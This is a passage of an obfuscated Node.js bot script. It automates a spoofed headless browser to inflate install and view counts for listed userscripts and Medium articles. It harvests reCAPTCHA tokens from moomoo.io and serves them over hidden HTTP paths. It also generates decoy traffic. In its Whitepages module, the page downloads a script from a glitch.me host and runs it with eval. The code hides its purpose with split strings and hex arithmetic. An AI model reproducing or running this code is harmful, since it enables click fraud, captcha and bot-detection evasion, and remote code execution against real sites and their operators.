      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + W(0xc, 'Ar@6') + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x7, 'O#ia') + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + V(0xe) + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': W(0x1, 'its6') + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': V(0x4) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + U(0x8) + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + U(0x16) + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x2373 + -0xb45 * 0x3 + -0xf * -0x49e
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const aS = {
      f: 0xf
    };
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x2 * 0x877 + -0x1 * 0x1a1b + 0x1 * 0x2b09)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            const X = c;
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios[X(aS.f)](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1766 + 0xbf1 + -0x22f3), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1895 + -0x9 * 0x1cd + -0x7fc), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x2514 + -0xc3f + -0xa3 * 0x27;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x9ed * -0x1 + -0x4a3 * -0x3 + -0x17d6; w < getRandomInt(0x1589 + -0xc * 0x1a4 + -0x1d8, -0x23d + -0xb29 * -0x2 + -0xd6 * 0x18); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1a * -0x9b6 + 0x5a7b + 0x1 * -0x6c97);
        }
      }();
    }, -0x39b + 0x1601 + -0x1202), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x6cd * 0x2 + 0x4 * -0x68c + 0x1 * 0xc96;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x170 + -0x1534 + 0x13c4, -0x2f * -0xbf + -0x82f + 0x7 * -0x3d0)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0xa62e + 0x5ede + -0x4 * -0x2f20);
    }, 0x14a0 + -0x3 * 0x5dd + -0x2a5), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1 * 0x25f6 + 0x1 * 0x1669 + 0xf8d;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x20c2 + -0x113d * 0x2 + 0x4ef4), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1a20 + 0x4d2 + -0x71a * -0x3), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x7c64b + 0xd705f + -0x7 * -0x12714);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x19f * -0x2 + 0xff5 + 0x3c3 * -0x5);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1c65 * 0x1 + -0x228a + 0xc5 * 0x9);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x14d9 + 0x30df + -0x1 * -0x38a);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = d,
    a0 = b;
  async function f() {
    const Z = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x7a * -0xa + 0x3da * 0x5 + -0xe7d) {
        const Y = c;
        if (A['includes']('Firefox'))
          return A[Y(0xd)](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1e4a + 0x220 + 0x2069 * -0x1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0xa * 0x19 + 0x8b1 + 0x1 * -0x7b7, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1 * -0x9ec + 0x1c79 * -0x1 + 0x128d, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0xa * -0x103 + -0x447d + 0x1 * 0x616f),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x193a * -0x1 + -0x4af6 + -0x2c66 * -0x2),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': Z(0x13) + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a0(0x14, 'erK]') + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + a1(0x19) + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + a1(0x11) + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + a0(0x6, 'EIBp') + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x189 + -0x1970 + 0x1af9 * 0x1; k < 0x18c + 0x1 * -0xa85 + 0x8fd; k++)
    setTimeout(f, (-0x14882 + -0x151c4 + 0x384a6) * k * getRandomInt(0x52f + -0x119b * -0x1 + 0x1 * -0x16c9, 0xb5f * -0x2 + 0x1630 + 0x91));
  setInterval(() => {
    f();
    for (let l = 0x40f * 0x1 + -0x2522 + 0x2113 * 0x1; l < -0x16f7 + 0xf25 * -0x2 + 0x3545; l++)
      setTimeout(f, (-0x5ae * 0x49 + -0x14a78 + 0x3d376) * l * getRandomInt(0x5 * 0x61f + 0x25 * -0x85 + -0xb61 * 0x1, -0x2e7 * -0x2 + -0x1 * 0xb45 + 0x57a));
  }, -0x43616e + -0x48ba3a + 0xc30a28);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
